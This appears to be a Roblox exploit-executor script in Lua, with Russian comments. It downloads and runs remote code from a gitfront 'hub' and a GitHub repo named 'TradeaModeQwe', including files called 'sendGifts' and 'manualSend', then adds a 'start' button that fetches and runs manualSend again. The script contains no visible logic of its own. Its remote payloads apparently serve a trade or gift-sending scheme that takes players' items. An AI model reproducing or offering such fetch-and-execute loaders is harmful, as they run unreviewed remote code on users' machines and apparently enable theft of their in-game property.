loadstring(game:HttpGet('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'))()
loadstring(game:HttpGet('https://raw.githubusercontent.com/qweaad1/TradeaModeQwe/main/API1'))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/qweaad1/TradeaModeQwe/main/sendGifts"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/qweaad1/TradeaModeQwe/main/manualSend"))()
local isClicked = false
-- Создаем экранное GUI
local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer.PlayerGui

local button = Instance.new("TextButton")
button.Parent = gui -- Родительский объект кнопки (может быть изменен)
button.Size = UDim2.new(0, 50, 0, 50) -- Размер кнопки
button.Position = UDim2.new(0.5, 50, 0.5, -900) -- Позиция кнопки
button.Text = "start" -- Текст на кнопке
button.MouseButton1Click:Connect(function()
if not isClicked then
loadstring(game:HttpGet("https://raw.githubusercontent.com/qweaad1/TradeaModeQwe/main/manualSend"))()

print("Кнопка была нажата")

end
end)
